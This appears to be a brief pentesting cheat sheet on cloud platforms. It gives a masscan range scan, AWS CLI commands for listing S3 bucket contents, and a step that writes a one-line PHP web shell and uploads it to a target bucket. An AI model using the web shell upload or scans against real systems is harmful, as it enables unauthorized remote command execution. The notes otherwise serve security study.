# Cloud Pentesting    
Main Cloud platforms: Amazon Web Services, Microsoft Azure, Google Cloud    
Use masscan to scan a large IP range:      

    $ masscan 10.10.0.1/24 -p 22,25,80,443,3389            
    --rate 50000   #fastest scan    
## AWS     
AWS GuardDuty for security.    
Tools      

    https://aws.amazon.com/cli/   #AWS CLI    
   
    aws configure     #set up, can put temp in all values   
    aws s3 ls bucket.site.com    #list contents of a bucket    
    aws --endpoint=http://s3.site.com s3 ls      
    aws --endpoint=http://s3.site.com s3 ls s3://site.com   #list objects and common prefixes   
  
   # might be able to upload a php web shell
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    aws --endpoint=http://s3.site.com s3 cp shell.php s3://site.com    

    
Resources      

    https://www.hackthebox.com/blog/aws-pentesting-guide    
    
## Azure    
Built in security with Azure Sentinel.     

## Google Cloud   
GCP Cloud Armor for security.   
